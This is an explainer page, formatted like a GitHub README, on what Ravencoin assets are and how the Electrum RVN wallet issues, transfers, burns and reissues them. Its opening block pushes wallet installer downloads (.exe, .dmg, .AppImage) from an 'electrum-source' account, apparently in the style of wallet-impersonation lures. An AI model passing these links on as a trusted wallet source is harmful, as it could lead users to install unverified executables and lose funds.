![Electrum RVN](assets/banner-article.png)

# What Is a Ravencoin Asset?

<!-- compact-download-block -->

<p align="center">A native object on-chain, not a token contract</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A Ravencoin asset is a named object on the Ravencoin chain itself - not an ERC-20 token, not a wrapper, not a bridged representation. It has a name, a quantity and a set of rules recorded by the protocol, and this wallet can issue, hold and send it without any contract in between.

## The three things that make it different

**It lives on the chain, not in a contract.** On Ethereum-style networks a token is a smart contract that keeps a mapping of balances. On Ravencoin the asset is part of the protocol's own data model, which is why a wallet can show it without talking to anything but the chain.

**The name is claimed once and kept.** Whoever issues a name has claimed it, and there is no rename afterwards.

**It moves with an ordinary fee.** A transfer pays the network fee in RVN, with no contract call and no approval step to go through first.

| | Ravencoin asset | ERC-20 token |
| --- | --- | --- |
| Where it lives | chain protocol | a contract |
| Supply rules | set at issuance by the protocol | written in contract code |
| Transfer | a normal transaction | a contract call |
| Fee | RVN | the host chain's gas token |
| Wrapper needed | no | no, but a bridge is needed to leave |

## The kinds of asset

**Named assets.** A root name with a quantity you choose, divisible or whole, reissuable or fixed.

**Sub-assets.** Children under a parent name, `PARENT/CHILD`, which give one issuer a namespace - [creating Ravencoin sub-assets](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md).

**Unique assets.** Exactly one indivisible unit with no reissue offered, which is what makes them usable as certificates - [unique Ravencoin assets](https://github.com/electrum-source/token-and-network/blob/main/unique-ravencoin-assets-in-electrum-rvn.md).

**Restricted assets.** Assets that carry the issuer's allow-list, so holding or receiving depends on being on it.

**Reissuable and fixed-supply.** A choice made at issuance. Reissuable means supply can grow; fixed means it cannot, and a holder can check which was chosen.

## Why the difference matters in practice

Because the asset is native, three things follow that surprise people coming from token platforms.

**A wallet either understands assets or it does not.** There is no contract to query for a fallback: a wallet that does not implement the asset layer shows an RVN balance and nothing else - [transferring Ravencoin assets with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md).

**Issuance is a one-time claim with a chain charge.** You pay to create the name, and the charge is part of the protocol rather than a subscription - [Ravencoin asset issuance cost](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md).

**The rules are visible.** A buyer can check the supply, the divisibility and whether reissue is possible without trusting a website. That is the whole advantage over a token whose promises live in a document.

## What assets are used for

- **Certificates and proofs** where a single, verifiable unit matters.
- **Collectibles and editions**, including series published under one parent name.
- **Community and project tokens** with an auditable supply.
- **Internal accounting** for a business that wants a public record of issuance.
- **Records with a timestamp**, where the point is that something existed at a moment.

What they are not: a general-purpose programmable token. There is no contract logic attached, so an asset cannot enforce royalties, run a vote or call another contract. If you need that, you need a different network.

## Holding and moving them

Assets sit in the same wallet as your RVN, at the same `R` addresses. That means one seed covers both, one backup covers both, and one fee currency moves both.

It also means the two failures are shared: lose the seed and you lose the assets, and empty the wallet of RVN and you cannot move them. Keep a small RVN float anywhere you hold assets.

## Issuing, in one paragraph

Choose a name, a quantity and the rules, pay the chain charge and the fee, wait for confirmations, and the asset exists at an address derived from your seed. It is a single transaction, it is permanent, and the name is yours afterwards - [how to issue a Ravencoin asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md). If it does not appear afterwards, [issued asset missing from Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md) is the display checklist.

## Burn and reissue

Two operations decide an asset's life after issuance: burning destroys units permanently, and reissuing adds units if the asset was created with that option. Both are one-way, and both are visible on-chain - [burning and reissuing assets](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md).

Mining and pools are a separate subject from holding assets, with their own payout and pool questions - [mine Ravencoin to an Electrum RVN wallet](https://github.com/electrum-source/token-and-network/blob/main/mine-ravencoin-to-an-electrum-rvn-wallet.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. The site's asset pages are the primary description of the feature set summarised here.

## FAQ

### Is a Ravencoin asset a token?

It is a native object on the Ravencoin chain with a name and a supply. It behaves like a token in use, but there is no contract behind it.

### Can I create one without paying anything?

No. Issuance carries a chain-level charge plus the ordinary network fee, both in RVN, and the wallet shows the amount before you confirm.

### Can an asset be renamed or deleted?

No. The name is permanent, and the asset exists as long as units of it do.

### Do I need a special wallet?

Yes - one that implements Ravencoin's asset layer. A wallet that only handles RVN will not display or transfer assets.

### Can assets be sent to any Ravencoin address?

To any address whose wallet understands assets. The address format is the same `R` format; the receiving software is what differs.

<!-- related-articles -->

## Related articles

- [Creating Ravencoin Sub-Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md)
- [Unique Ravencoin Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/unique-ravencoin-assets-in-electrum-rvn.md)
- [Transferring Ravencoin Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md)
- [Ravencoin Asset Issuance Cost in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md)
